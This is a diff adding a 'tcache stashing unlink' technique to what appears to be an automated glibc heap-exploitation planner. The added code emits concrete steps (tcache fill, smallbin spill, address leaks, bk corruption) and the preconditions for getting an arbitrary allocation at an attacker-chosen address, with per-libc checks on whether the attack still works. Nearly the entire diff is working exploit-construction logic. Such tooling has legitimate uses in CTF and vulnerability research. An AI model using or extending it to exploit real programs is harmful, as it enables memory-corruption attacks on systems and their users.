@@ -198,6 +198,84 @@ def _unsorted_bin_attack(v: Vuln, g: Goal, e: Env):
                    "glibc>=2.29 added a bk-integrity check -- pair with a large-bin attack"]
 
 
+def _tcache_stash(v: Vuln, g: Goal, e: Env):
+    """Tcache stashing unlink: arbitrary allocation out of the ONE unlink glibc still does not
+    check. Everything stated here was measured on the libc in hand, not taken from the recipe --
+    three details of which are wrong on current glibc."""
+    from . import heap as _heap
+    guard = (_heap.smallbin_stash_guard(e.libc_data) if e.libc_data else
+             {"sites": None, "unchecked": None,
+              "reason": "no libc bytes supplied, so whether the stashing unlink is still "
+                        "unchecked is UNKNOWN -- pass Env(libc_data=...) to decide it"})
+    cap = _heap.tcache_capacity() or _heap.TCACHE_COUNT
+    bypass = _heap.tcache_bypass_allocators()
+    bypassers = [k for k in ("calloc", "memalign", "realloc") if bypass.get(k)]
+    steps = [
+        {"op": "note", "detail": f"tcache capacity for this size class, measured: {cap} "
+                                 f"(the recipes all say 7)"},
+        {"op": "alloc", "handle": f"V0..V{cap + 1}", "size": v.size,
+         "note": f"{cap + 2} chunks, each followed by a guard so no free consolidates"},
+        {"op": "free", "handle": f"V0..V{cap + 1}",
+         "note": f"the first {cap} fill the tcache; the last two spill to the unsorted bin"},
+        {"op": "alloc", "handle": "_", "size": max(v.size * 8, 0x1000),
+         "note": "a bigger request: its unsorted-bin scan SORTS the two spilled chunks into the "
+                 "smallbin, and a view of either leaks the bin head (libc) and the other's "
+                 "address (heap) -- both leaks for free"},
+        {"op": "write_bk", "handle": "the chunk whose bk IS the bin head", "value": "TARGET - 0x10",
+         "detail": "that chunk is what the STASHING loop unlinks; last(bin) goes through the "
+                   "guarded unlink instead, so leave its links alone"},
+        {"op": "write", "handle": "TARGET + 0x8", "value": "the smallbin head",
+         "detail": "the fake chunk's own bk, read as the next last(bin). Point it at the bin head "
+                   "or the loop spins forever: glibc's `if (tc_victim != 0)` skips the body "
+                   "without advancing, so a NULL there hangs rather than crashes"},
+    ]
+    if bypassers:
+        steps.append({"op": "note", "detail":
+                      f"trigger: {' or '.join(bypassers)} -- measured to bypass the tcache on "
+                      "this libc, so the smallbin path can be reached with the tcache FULL "
+                      "(fill it to capacity-1 and the loop stops after one stash, which keeps "
+                      "the libc write at TARGET)"})
+    if not bypass.get("calloc", True):
+        steps.append({"op": "note", "detail":
+                      "calloc does NOT bypass the tcache on this libc -- it takes the tcache head "
+                      "like malloc. Every published version of this attack triggers it with "
+                      "calloc, and that no longer works."})
+    steps.append({"op": "alloc", "handle": "__", "size": v.size,
+                  "note": "with that tcache bin EMPTY this reaches the smallbin path: the guarded "
+                          "unlink hands out last(bin), then the stashing loop writes &bin to "
+                          "TARGET and stashes the fake chunk"})
+    steps.append({"op": "alloc", "handle": "ARB", "size": v.size,
+                  "note": "and this one RETURNS TARGET"})
+    precond = [f"a smallbin size: chunk < 0x400 (requested {v.size:#x})",
+               "TARGET 16-aligned, and TARGET+0x8 writable before the trigger (it is the fake "
+               "chunk's bk)",
+               "a writable byte at TARGET-0x10+chunk_size+0x8 (set_inuse_bit_at_offset)",
+               "NO safe-link mangling anywhere: smallbin fd/bk are not protected, so unlike "
+               "tcache poisoning this needs no heap leak to mangle a pointer with"]
+    if guard["unchecked"] is True:
+        precond.append("live here: " + guard["reason"])
+        precond.append("with a plain malloc trigger the libc write at TARGET is TRANSIENT -- "
+                       "tcache_put writes the fake chunk's `next` at fake+0x10, which is TARGET, "
+                       "over the &bin the unlink just put there. The deliverable is the "
+                       "ARBITRARY ALLOCATION.")
+    elif guard["unchecked"] is False:
+        precond.append("BLOCKED: " + guard["reason"])
+    else:
+        precond.append("UNKNOWN: " + guard["reason"])
+    steps.append({"op": "note", "detail": guard["reason"]})
+    return steps, precond
+
+
+def _tcache_stash_primitive(e: Env) -> str:
+    from . import heap as _heap
+    if not e.libc_data:
+        return "arbitrary allocation (unverified: no libc supplied)"
+    g = _heap.smallbin_stash_guard(e.libc_data)
+    if g["unchecked"] is False:
+        return "nothing: the stashing unlink is checked on this libc"
+    return "arbitrary allocation at a chosen address, with no safe-link mangling"
+
+
 def _large_bin_guard(e: Env) -> dict:
     """Whether this environment's large-bin insertion still writes unchecked. Decided from the
     libc's own bytes when we have them, and otherwise from the version, with that said out loud."""
@@ -296,6 +374,17 @@ _ADVISORY = [
      "build": _unsorted_bin_attack,
      "summary": "corrupt a free unsorted-bin chunk's bk to (TARGET-0x10); the next malloc "
                 "scanning it writes &main_arena.bins[..] to TARGET."},
+    {"technique": "tcache_stashing",
+     "primitive": "arbitrary allocation at a chosen address",
+     "primitive_for": _tcache_stash_primitive,
+     # A smallbin size, and something that can write a freed chunk's bk.
+     "applies": lambda v, e: (v.vclass in ("uaf", "heap_overflow", "double_free")
+                              and request2size(v.size) < 0x400
+                              and not is_fastbin(request2size(v.size))),
+     "build": _tcache_stash, "confirmed": True,
+     "summary": "fill the tcache, spill two same-size chunks into the smallbin, corrupt the "
+                "to-be-stashed one's bk; the stashing loop's UNCHECKED unlink then puts a fake "
+                "chunk at TARGET-0x10 into the tcache, so the next allocation returns TARGET."},
     {"technique": "large_bin_attack",
      "primitive": "write a heap/controlled address to a chosen location",
      # Decided per-libc rather than stated once: the guard that makes or breaks this technique is
